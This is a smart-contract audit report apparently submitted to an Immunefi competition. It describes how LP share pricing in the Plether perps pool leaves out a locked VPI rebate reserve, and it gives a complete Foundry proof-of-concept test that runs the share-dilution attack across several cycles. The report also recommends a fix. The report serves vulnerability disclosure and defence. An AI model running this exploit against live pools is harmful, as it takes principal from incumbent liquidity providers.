# \#98834 [SC-Critical] An LP can mint Junior shares at a discount it creates itself by parking pool cash in its own VPI reserve

**Submitted on Nov 10th 2026 at 13:47:12 UTC by @Avicoh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98834
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

**Severity claimed:** Critical
**Impact:** Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
**Targets (commit a82d4fef):**
- `packages/perps/src/libraries/HousePoolAccountingLib.sol` — `buildReconcileSnapshot` (lines 60-78)
- `packages/perps/src/CfdEngineSettlementSidecar.sol` — open rebate payout (lines 442-444)
- `packages/perps/src/MarginClearinghouse.sol` — VPI rebate reserve (lines 843-852)
- `packages/perps/src/HousePool.sol` — deposit activation and redemption pricing (lines 835-841, 915-919)

## Brief

When a trader opens a skew-reducing position, the pool pays the VPI rebate in cash. The cash is locked in that trader's VPI reserve and always returns to the pool when the position closes or is liquidated. LP NAV does not count the reserve. Junior shares are therefore under-priced by the whole rebate from the open until the close.

An attacker uses this in one sequence:
1. Queue a Junior deposit.
2. One minute before the epoch boundary, open the skew-reducing position.
3. Settle the epoch. The deposit activates at the under-stated NAV.
4. Close the position. The rebate returns to the pool, and the attacker's new shares own most of it.
5. Redeem after the one-hour cooldown.

Incumbent Junior LPs lose principal. In the PoC, on a pool with the release limits and no other trader, incumbents lose 0.25% of their capital in one cycle and 1.55% in five cycles (about 15 hours). The attacker profits after all fees.

## Vulnerability details

1. **The pool pays the rebate out of its own cash.** A negative open trade cost becomes `poolRebatePayoutAssets`. `CfdEngineSettlementSidecar.sol:442-444` sends it with `HousePool.payOut`, so pool `physicalAssets` falls by the gross rebate.
2. **The cash is locked and always comes back.**
   - It sits in the account's VPI reserve (`MarginClearinghouse.sol:843-852`). The reserve is non-withdrawable and must equal `max(-vpiAccrued, 0)`.
   - At close, `CloseAccountingLib.sol:116-118` forces `proportionalAccrual + vpiDelta >= 0`, so the trader repays at least the whole rebate. Liquidation consumes the same reserve.
   - SECURITY.md:376 lists this as the "VPI reserve conservation" invariant. The reserve is a fully funded receivable of the pool.
3. **NAV ignores it.**
   - `HousePoolAccountingLib.buildReconcileSnapshot` prices deposit activation and redemption from `physicalAssets + terminalLpPriceDelta - traderClaims`.
   - The terminal curve's collectible cap is only the PnL pledge plus the same-account trader claim.
   - No term represents the VPI reserve. Junior NAV drops by the gross rebate at the open and recovers by the same amount at the close.
4. **One party controls both the dip and the entry.**
   - The trader leg, the Junior deposit request and `router.settleLpEpoch` are all public.
   - Junior deposits have no cap.
   - The rebate is `vpiFactor * skew^2 / (2 * depth)`, up to 0.08% of pool depth at the 40% skew cap.
   - If no skew exists, the attacker builds it with a second account.

### Why this is not the documented design

SECURITY.md:871-872 states that the VPI reserve does not inflate symmetric NAV. That sentence describes the accounting. It does not describe or accept the consequence shown here, and the consequence contradicts the properties the protocol states elsewhere:

- **Not a listed limitation.** The "LP accounting limitations" and "VPI limitations" sections under Known Limitations (SECURITY.md:1380-1444) do not mention LP entry priced against the reserve.
- **Symmetric NAV is broken.** SECURITY.md:859-860 says new LPs enter at the same marked-liability discount as incumbents. Here the entrant gets a discount that only the entrant can collect on.
- **VPI extraction is meant to be impossible.** SECURITY.md:1443 says the lifetime clamp zeroes rebate-only round trips. The comment at `CloseAccountingLib.sol:112` says the clamp prevents LP sandwich attacks. `VpiDepth.t.sol:258` asserts that a round trip "must not extract LP cash". The clamp holds for the trader account alone and fails once the same party adds an LP leg.
- **The one accepted LP-timing effect is different.** ACCOUNTING_SPEC.md:739-740 accepts that timing can move old carry revenue to a new LP. Carry is trader-paid yield with credit risk. Here the pool's own principal leaves and is certain to return.
- **The gap is untested.** The shared LP test fixtures (`HousePoolTestBase`, `AtomicLpEpochSettlementFixture`, and `BasePerpTest` by default) set `vpiFactor: 0`.

## Impact details

All numbers come from the PoC below. It uses the release risk parameters (`vpiFactor` 0.01, `maxSkewRatio` 0.4, execution fee 4 bps, maintenance 0.1%, initial 0.2%) and a flat mark. Each attack run is compared with a control run from the same snapshot with the same clock and the same honest activity. Attacker profit is the combined change of its LP account and its trader accounts, after every fee, carry and VPI charge.

**Release pool: Senior 3.9M, Junior 1M, Senior limits 40M / 80%.**

| Scenario | Incumbent Junior loss vs control | Incumbents end at (from 1,000,999) | Attacker net profit |
| --- | --- | --- | --- |
| No other trader, one cycle (test 1) | 2,475.70 USDG (0.25%) | 998,345 | +195.30 USDG |
| No other trader, five cycles, about 15 hours (test 8) | 15,469.36 USDG (1.55%) | 984,924 | +7,108.12 USDG |
| Existing 1.9M skew from an unrelated trader, one cycle (test 2) | 3,254.73 USDG (0.33%) | 998,345 | +1,726.83 USDG |

**Junior-only 1M pool, 400k skew.**

| Scenario | Incumbent Junior loss vs control | Attacker net profit |
| --- | --- | --- |
| Existing skew, one cycle (test 3) | 720.06 USDG | +397.70 USDG |
| Existing skew, five cycles (test 4) | 3,603.74 USDG | +1,994.18 USDG |
| No other trader, one cycle (test 5) | 555.90 USDG | +75.50 USDG |
| Existing skew, 5 bps Pyth confidence on every fill (test 6) | 675.94 USDG | +353.83 USDG |

- **Victims:** incumbent Junior LPs. Junior is the residual tranche and absorbs the whole dip. In every scenario they finish below the capital they held before any trading. The loss is principal, not unclaimed yield.
- **Loss per cycle:** about `s * rebate`, where `s` is the attacker's share of Junior after its deposit. The cap is 0.08% of pool depth per cycle. With Senior at its 80% limit that is 0.4% of Junior capital per cycle.
- **Repeatable:** a cycle takes three one-hour epochs. Nothing is consumed that blocks the next one. When the attacker builds the skew itself, that leg stays open, so later cycles cost only the two fees of the skew-reducing leg.
- **Exposure:** the attacker's trader leg is open for 71 seconds. Its LP capital is Junior first-loss capital for about two hours per cycle.

**Limits of the attack (test 7).** Incumbents lose at every attacker size. The attacker only profits when its Junior share is large enough to cover its own execution fees:

- with an existing skew: `s * r > 0.16`, where `r` is skew divided by pool depth (at most 0.4),
- when it builds the skew itself: `s * r > 0.32`.

| Attacker Junior deposit (Junior-only 1M pool, 400k skew) | Share | Incumbent loss | Attacker net |
| --- | --- | --- | --- |
| 250k | 20% | 159.89 | -160.79 |
| 500k | 33% | 266.53 | -54.47 |
| 667k | 40% | 319.95 | -1.21 |
| 800k | 44% | 355.41 | +34.15 |
| 1M | 50% | 399.86 | +78.47 |
| 3M | 75% | 599.96 | +277.96 |
| 9M | 90% | 720.06 | +397.70 |

The attacker's share is measured against Junior capital only, so a Senior-heavy pool needs proportionally less attacker capital for the same share.

**Not a known issue.**
- SCAN-30 and SCAN-31 concern pool depth changing the size of a close VPI.
- The pre-audit SC-H1 concerns Senior yield in an earlier vault design.
- No audit item or Known Limitations entry covers LP entry priced against the VPI reserve.

## Recommendation

Count the locked VPI reserve as a pool receivable when pricing LP shares. Track the aggregate `max(-vpiAccrued, 0)` in the engine and add it to the terminal assets used by `buildReconcileSnapshot`. The reserve conservation invariant guarantees the amount is fully funded, so it is not a phantom receivable. Like other marked receivables, it should price ownership without funding redemptions until it is collected.

An alternative is to keep the rebate inside the pool as an earmarked liability until the position closes. Either change leaves NAV unchanged across the open and the close.

## Proof of Concept

## Proof of concept

Place the test file below at `packages/perps/test/perps/poc/CL02_VpiRebateNavDilution.t.sol` in a clean checkout of a82d4fef and run:

```bash
git submodule update --init --recursive
forge test --root packages/perps --match-path 'test/perps/poc/CL02_VpiRebateNavDilution.t.sol' -vv
```

- No in-scope contract is modified. Mocks are used only for Pyth and USDG (the repository's own `BasePerpTest` fixture).
- The fixture's router is the repository's `LegacyOrderRouterHarness`. It inherits the production `OrderRouter` unchanged and adds one helper, `commitOrder`, which encodes the request and delegatecalls the production V3 commit with the trader as `msg.sender`. Execution, mark refresh and epoch settlement are the production functions.
- Every attack step is sent from an address with no role: `clearinghouse.deposit`, `router.commitOrder`, `router.executeOrder`, `router.updateMarkPrice`, `router.settleLpEpoch`, and the Junior vault's `requestDeposit`, `claimDeposit`, `requestRedeem` and `claimRedeem`.
- The only owner action is in the setup of tests 1, 2 and 8. It replaces the fixture's Senior limits with the release values (40M, 80%).

```
[PASS] test_1_selfContained_releasePool()
    incumbent Junior value, start                1000999324196
    incumbent Junior value, control (no attack)  1000821097352
    incumbent Junior value, after attack         998345398493
    incumbent loss caused by the attack          2475698859
    attacker VPI reserve while LP deposit priced 3679406731
    attacker trader leg open for (seconds)       71
    attacker net profit (LP + traders, after all fees, carry and VPI):
  195296254
[PASS] test_8_selfContained_releasePool_fiveCycles()
    incumbent Junior value, control (no attack)  1000393590428
    incumbent Junior value, after attack         984924231056
    incumbent loss caused by the attack          15469359372
    attacker net profit (LP + traders, after all fees, carry and VPI):
  7108117067
```

Full test file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";
import {BasePerpTest} from "../BasePerpTest.sol";

/// A skew-reducing open receives a pool-funded VPI rebate. The cash is locked in the trader's dedicated VPI reserve and
/// is always clawed back when the position closes or is liquidated, but LP NAV excludes that reserve. Junior shares are
/// therefore under-priced between the open and the close. An LP who activates a deposit inside that window and redeems
/// after the clawback takes the rebate from incumbent LPs.
///
/// Every attack step is sent from an unprivileged address through a public entrypoint. The mark never moves.
/// The only owner action is in the Senior-heavy tests' setup, which applies the release Senior limits
/// (40M cap, 80% max share) in place of the test fixture's defaults.
contract CL02_VpiRebateNavDilution is BasePerpTest {

    uint256 internal constant PRICE = 1e8;
    address internal constant HONEST_TRADER = address(0x7001); // unrelated heavy-side trader (LONG)
    address internal constant ATT_TRADER = address(0xA001); // attacker's skew-reducing trader (SHORT)
    address internal constant ATT_TRADER_2 = address(0xA003); // attacker's skew-building trader (self-contained variant)
    address internal constant ATT_LP = address(0xA002); // attacker's Junior LP
    address internal constant SENIOR_LP = address(0x5E5E);
    address internal constant KEEPER = address(0xBEEF); // no role: executes orders, refreshes the mark, settles epochs

    uint256 internal constant TRADER_FUNDING = 200_000e6;

    uint256 internal skewSize = 400_000e18; // 400k notional at 1.0 (max skew is 40% of pool depth)
    uint256 internal attLpDeposit = 9_000_000e6;
    uint64 internal conf; // Pyth confidence per component, in 1e-8 price units

    uint256 internal attackerLpFunded;
    uint256 internal lastVpiReserve; // attacker trader's locked VPI reserve right after its open
    uint256 internal lastTraderLegSeconds; // how long the attacker's trader leg stayed open

    /// Release risk parameters (DEPLOY_PARAMS / deployment config at a82d4fef).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp(); // seeds + 1M honest Junior from address(this)
        _fundTrader(HONEST_TRADER, TRADER_FUNDING);
        _fundTrader(ATT_TRADER, TRADER_FUNDING);
        _fundTrader(ATT_TRADER_2, TRADER_FUNDING);
        vm.deal(KEEPER, 10 ether);
        vm.deal(HONEST_TRADER, 1 ether);
        vm.deal(ATT_TRADER, 1 ether);
        vm.deal(ATT_TRADER_2, 1 ether);
    }

    // --- plumbing ------------------------------------------------------------------------------------------

    function _tick() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _liveData() internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(PRICE)), conf, -8, vm.getBlockTimestamp(), previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// Permissionless mark refresh, sent by KEEPER. The calldata is built before the prank so that the prank applies to
    /// the router call and not to a view call made while building the arguments.
    function _refresh() internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        bytes[] memory data = _liveData();
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _fill() internal {
        uint64 head = router.nextExecuteId();
        require(head != 0, "nothing queued");
        _tick();
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(head);
        uint256 publishTime = uint256(pending.commitTime) + 1;
        if (publishTime > vm.getBlockTimestamp()) publishTime = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(PRICE)), conf, -8, publishTime, publishTime - 1);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(head, data);
        require(r.status == OrderV3Types.LifecycleStatus.Executed, "order did not execute");
    }

    function _open(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        _refresh();
        uint256 target = side == CfdTypes.Side.LONG ? PRICE * 98 / 100 : PRICE * 102 / 100;
        vm.prank(trader);
        router.commitOrder(side, size, margin, target, false);
        _fill();
    }

    function _closeAll(
        address trader
    ) internal {
        (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(trader);
        _refresh();
        vm.prank(trader);
        router.commitOrder(side, size, 0, 0, true);
        _fill();
    }

    function _nextBoundary() internal view returns (uint256) {
        return (vm.getBlockTimestamp() / 1 hours + 1) * 1 hours;
    }

    /// Permissionless LP epoch settlement, sent by KEEPER. Returns false when no LP request was queued for the epoch
    /// (the call reverts with NoLpEpochProgress); the mark is then refreshed instead.
    function _settleAt(
        uint256 timestamp
    ) internal returns (bool settled) {
        if (timestamp > vm.getBlockTimestamp()) vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _liveData();
        vm.prank(KEEPER);
        try router.settleLpEpoch(data) {
            settled = true;
        } catch {
            _refresh();
        }
    }

    function _settleNextEpoch() internal returns (bool) {
        return _settleAt(_nextBoundary() + 10);
    }

    /// 2% margin on the skew notional (10x the 0.2% initial requirement).
    function _margin() internal view returns (uint256) {
        return skewSize / 1e12 / 50;
    }

    function _traderValue(
        address t
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(t) + clearinghouse.balanceAssets(t) + engine.traderClaimBalanceAssets(t);
    }

    /// Attacker = Junior LP account + both trader accounts. Profit is net of every fee, carry and VPI charge.
    function _attackerPnl() internal view returns (int256) {
        uint256 start = attackerLpFunded + 2 * TRADER_FUNDING;
        uint256 end_ = settlementToken.balanceOf(ATT_LP) + _traderValue(ATT_TRADER) + _traderValue(ATT_TRADER_2);
        return int256(end_) - int256(start);
    }

    function _honestJuniorValue() internal returns (uint256) {
        _settleNextEpoch();
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    /// Epoch boundary that a Junior deposit requested now will activate at (requests need to precede the 5 minute cutoff).
    function _targetBoundary() internal view returns (uint256 boundary) {
        boundary = _nextBoundary();
        if (vm.getBlockTimestamp() + 5 minutes + 30 >= boundary) boundary += 1 hours;
    }

    // --- the attack ----------------------------------------------------------------------------------------

    /// One attack cycle. Precondition: LONG-heavy skew of `skewSize` exists.
    function _attackCycle() internal {
        // 1. Attacker LP queues a Junior deposit for the next epoch.
        uint256 boundary = _targetBoundary();
        settlementToken.mint(ATT_LP, attLpDeposit);
        attackerLpFunded += attLpDeposit;
        vm.startPrank(ATT_LP);
        settlementToken.approve(address(juniorVault), attLpDeposit);
        uint256 requestId = juniorVault.requestDeposit(attLpDeposit, ATT_LP, ATT_LP);
        vm.stopPrank();

        // 2. One minute before the boundary the attacker trader flattens the skew. The pool pays the VPI rebate in cash
        //    into the trader's locked VPI reserve, and Junior NAV drops by that amount.
        vm.warp(boundary - 60);
        vm.roll(vm.getBlockNumber() + 1);
        _open(ATT_TRADER, CfdTypes.Side.SHORT, skewSize, _margin());
        uint256 openedAt = vm.getBlockTimestamp();
        require(openedAt < boundary, "leg opened before the boundary");
        lastVpiReserve = clearinghouse.vpiRebateReserveAssets(ATT_TRADER);
        require(lastVpiReserve > 0, "rebate is locked in the VPI reserve");

        // 3. Anyone settles the epoch: the deposit activates at the under-stated Junior NAV.
        require(_settleAt(boundary + 10), "epoch settled");
        vm.startPrank(ATT_LP);
        uint256 shares =
            juniorVault.claimDeposit(requestId, juniorVault.claimableDepositRequest(requestId, ATT_LP), ATT_LP, ATT_LP);
        vm.stopPrank();

        // 4. The attacker trader closes at once. The clawback returns the rebate to the pool, now shared with the
        //    attacker LP.
        _closeAll(ATT_TRADER);
        lastTraderLegSeconds = vm.getBlockTimestamp() - openedAt;
        require(clearinghouse.vpiRebateReserveAssets(ATT_TRADER) == 0, "reserve fully returned");

        // 5. After the 1 h share cooldown the attacker LP redeems everything at the next boundary.
        _settleAt(boundary + 1 hours + 10);
        vm.startPrank(ATT_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATT_LP, ATT_LP);
        vm.stopPrank();
        require(_settleAt(boundary + 2 hours + 10), "redeem epoch settled");
        vm.startPrank(ATT_LP);
        juniorVault.claimRedeem(redeemId, juniorVault.claimableRedeemRequest(redeemId, ATT_LP), ATT_LP, ATT_LP);
        vm.stopPrank();
        require(juniorVault.balanceOf(ATT_LP) == 0, "attacker LP fully exited");
    }

    /// Control: the same clock and the same epoch settlements, without the attacker.
    function _idleCycle() internal {
        uint256 boundary = _targetBoundary();
        _settleAt(boundary + 10);
        _settleAt(boundary + 1 hours + 10);
        _settleAt(boundary + 2 hours + 10);
    }

    /// Variant A: an unrelated trader is LONG-heavy. `cycles` attack cycles vs an idle control from the same snapshot.
    function _existingSkew(
        uint256 cycles
    ) internal returns (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) {
        _open(HONEST_TRADER, CfdTypes.Side.LONG, skewSize, _margin());
        _settleNextEpoch();

        uint256 snap = vm.snapshotState();
        for (uint256 i; i < cycles; ++i) {
            _idleCycle();
        }
        _closeAll(HONEST_TRADER);
        honestControl = _honestJuniorValue();
        vm.revertToState(snap);

        for (uint256 i; i < cycles; ++i) {
            _attackCycle();
        }
        _closeAll(HONEST_TRADER);
        honestAttack = _honestJuniorValue();
        attackerPnl = _attackerPnl();
    }

    /// Variant B: no other traders. The attacker builds the skew itself with a second account, so the only
    /// counterparties are the incumbent LPs.
    function _selfContained(
        uint256 cycles
    ) internal returns (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) {
        uint256 snap = vm.snapshotState();
        _settleNextEpoch();
        for (uint256 i; i < cycles; ++i) {
            _idleCycle();
        }
        honestControl = _honestJuniorValue();
        vm.revertToState(snap);

        _open(ATT_TRADER_2, CfdTypes.Side.LONG, skewSize, _margin());
        _settleNextEpoch();
        for (uint256 i; i < cycles; ++i) {
            _attackCycle();
        }
        _closeAll(ATT_TRADER_2);
        honestAttack = _honestJuniorValue();
        attackerPnl = _attackerPnl();
    }

    /// Release pool structure: Senior limits 40M / 80%, Senior 3.9M and Junior 1M (79.6% Senior).
    function _releaseSeniorHeavyPool() internal {
        _setSeniorCapacity(40_000_000e6, 8000);
        _refresh();
        _fundSenior(SENIOR_LP, 3_900_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share limit");
        skewSize = 1_900_000e18; // 38.8% of depth, inside the 40% skew cap
    }

    function _report(
        uint256 honestStart,
        uint256 honestControl,
        uint256 honestAttack,
        int256 attackerPnl
    ) internal view {
        console2.log("  incumbent Junior value, start               ", honestStart);
        console2.log("  incumbent Junior value, control (no attack) ", honestControl);
        console2.log("  incumbent Junior value, after attack        ", honestAttack);
        console2.log("  incumbent loss caused by the attack         ", honestControl - honestAttack);
        console2.log("  attacker VPI reserve while LP deposit priced", lastVpiReserve);
        console2.log("  attacker trader leg open for (seconds)      ", lastTraderLegSeconds);
        console2.log("  attacker net profit (LP + traders, after all fees, carry and VPI):");
        console2.logInt(attackerPnl);
    }

    // --- tests ---------------------------------------------------------------------------------------------

    /// Lead scenario. Release risk parameters and release Senior limits, no third-party trader: the attacker alone
    /// builds the skew, takes the rebate through the LP leg and unwinds.
    function test_1_selfContained_releasePool() public {
        _releaseSeniorHeavyPool();
        uint256 honestStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _selfContained(1);
        _report(honestStart, honestControl, honestAttack, attackerPnl);
        assertGt(honestControl - honestAttack, 2_400e6, "incumbent Junior LPs lose >0.24% of capital in one cycle");
        assertLt(honestAttack, honestStart, "incumbents end below their starting capital");
        assertGt(attackerPnl, 150e6, "attacker profits with no third-party trader");
        assertLt(lastTraderLegSeconds, 120, "trader leg is open for about a minute");
    }

    /// Same pool, but the skew already exists (an unrelated trader is LONG-heavy).
    function test_2_existingSkew_releasePool() public {
        _releaseSeniorHeavyPool();
        uint256 honestStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _existingSkew(1);
        _report(honestStart, honestControl, honestAttack, attackerPnl);
        assertGt(honestControl - honestAttack, 3_000e6, "incumbent Junior LPs lose >0.3% of capital in one cycle");
        assertLt(honestAttack, honestStart, "incumbents end below their starting capital");
        assertGt(attackerPnl, 1_500e6, "attacker nets a profit after all fees");
    }

    /// Junior-only 1M pool with an existing 400k skew.
    function test_3_existingSkew_juniorOnly_oneCycle() public {
        uint256 honestStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _existingSkew(1);
        _report(honestStart, honestControl, honestAttack, attackerPnl);
        assertGt(honestControl - honestAttack, 700e6, "incumbent Junior LPs lose most of the rebate");
        assertLt(honestAttack, honestStart, "incumbents end below their starting capital");
        assertGt(attackerPnl, 350e6, "attacker nets a profit after all fees");
    }

    /// The same attack repeated five times against the same skew.
    function test_4_existingSkew_juniorOnly_fiveCycles() public {
        uint256 honestStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _existingSkew(5);
        _report(honestStart, honestControl, honestAttack, attackerPnl);
        assertGt(honestControl - honestAttack, 3_500e6, "loss repeats every cycle");
        assertGt(attackerPnl, 1_750e6, "profit repeats every cycle");
    }

    /// Junior-only pool, no third-party trader.
    function test_5_selfContained_juniorOnly() public {
        uint256 honestStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _selfContained(1);
        _report(honestStart, honestControl, honestAttack, attackerPnl);
        assertGt(honestControl - honestAttack, 500e6, "incumbent Junior LPs lose principal");
        assertLt(honestAttack, honestStart, "incumbents end below their starting capital");
        assertGt(attackerPnl, 0, "attacker profits with no third-party trader");
    }

    /// Non-zero Pyth confidence (5 bps of price on every component; the release hard cap is 10 bps), so both attacker
    /// legs execute at the adverse-confidence price.
    function test_6_existingSkew_withOracleConfidence() public {
        conf = 50_000;
        uint256 honestStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _existingSkew(1);
        _report(honestStart, honestControl, honestAttack, attackerPnl);
        assertGt(honestControl - honestAttack, 650e6, "incumbents still lose");
        assertGt(attackerPnl, 300e6, "attacker still profits with 5 bps confidence on both legs");
    }

    /// Lead scenario repeated five times. The attacker's skew-building leg stays open across cycles, so every cycle
    /// after the first costs only the two fees of the skew-reducing leg.
    function test_8_selfContained_releasePool_fiveCycles() public {
        _releaseSeniorHeavyPool();
        uint256 honestStart = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _selfContained(5);
        _report(honestStart, honestControl, honestAttack, attackerPnl);
        assertGt(honestControl - honestAttack, 10_000e6, "incumbent Junior LPs lose >1% of capital in five cycles");
        assertLt(honestAttack, honestStart, "incumbents end below their starting capital");
        assertGt(attackerPnl, 5_000e6, "attacker profit grows with every cycle");
    }

    /// Limits of the attack: sweep the attacker's Junior deposit against a Junior-only 1M pool with a 400k skew.
    /// Incumbents lose at every size. The attacker only profits once its Junior share is large enough.
    function test_7_attackerShareSweep() public {
        uint256[7] memory deposits =
            [uint256(250_000e6), 500_000e6, 667_000e6, 800_000e6, 1_000_000e6, 3_000_000e6, 9_000_000e6];
        int256[7] memory pnl;
        for (uint256 i; i < deposits.length; ++i) {
            uint256 snap = vm.snapshotState();
            attLpDeposit = deposits[i];
            attackerLpFunded = 0;
            (uint256 honestControl, uint256 honestAttack, int256 attackerPnl) = _existingSkew(1);
            pnl[i] = attackerPnl;
            console2.log("attacker Junior deposit (USDG)", deposits[i] / 1e6);
            console2.log("   incumbent loss ", honestControl - honestAttack);
            console2.log("   attacker net profit");
            console2.logInt(attackerPnl);
            assertGt(honestControl, honestAttack, "incumbents lose at every attacker size");
            vm.revertToState(snap);
        }
        assertLt(pnl[0], 0, "a 20% Junior share is not enough to cover the attacker's fees");
        assertGt(pnl[4], 0, "a 50% Junior share is");
    }
}
```

